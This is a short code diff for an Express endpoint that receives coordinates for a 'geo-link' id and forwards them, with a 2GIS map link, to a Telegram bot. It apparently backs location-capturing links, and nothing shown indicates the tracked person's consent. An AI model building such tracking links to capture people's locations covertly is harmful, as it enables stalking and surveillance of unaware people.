@@ -45,13 +45,9 @@ app.post('/api/track/:id', async (req, res) => {
   if (!latitude || !longitude) {
     return res.status(400).json({ error: 'No coordinates' });
   }
-  let address = clientAddress;
-  if (!address) {
-    // Если адрес не пришёл с клиента, определяем через Яндекс
-    address = await getAddressFromCoords(latitude, longitude);
-  }
+  const address = clientAddress || 'Адрес не определён';
   // Отправка в Telegram
-  const text = `Гео-ссылка: ${id}\nКоординаты: ${latitude}, ${longitude}\nАдрес: ${address}\nhttps://yandex.ru/maps/?ll=${longitude}%2C${latitude}&z=16`;
+  const text = `Гео-ссылка: ${id}\nКоординаты: ${latitude}, ${longitude}\nАдрес: ${address}\nhttps://2gis.ru/?query=${latitude},${longitude}`;
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   await fetch(url, {
     method: 'POST',
